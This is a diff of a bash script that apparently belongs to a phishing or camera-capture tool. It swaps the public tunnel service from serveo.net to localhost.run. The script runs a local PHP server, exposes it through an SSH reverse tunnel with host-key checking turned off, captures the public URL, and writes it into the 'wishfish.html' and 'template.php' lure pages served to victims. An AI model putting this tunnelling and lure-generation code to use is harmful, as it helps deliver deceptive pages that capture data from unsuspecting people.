@@ -87,7 +87,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting localhost...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -95,11 +95,11 @@ fi
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:x serveo.net  2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:x localhost.run  2> /dev/null > sendlink ' &
 
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:x serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:x localhost.run 2> /dev/null > sendlink ' &
 
 sleep 8
 fi
@@ -107,7 +107,7 @@ printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:
 fuser -k x/tcp > /dev/null 2>&1
 php -S localhost:x > /dev/null 2>&1 &
 sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
@@ -201,7 +201,7 @@ fi
 
 payload() {
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink)
 
 sed 's+forwarding_link+'$send_link'+g' wishfish.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
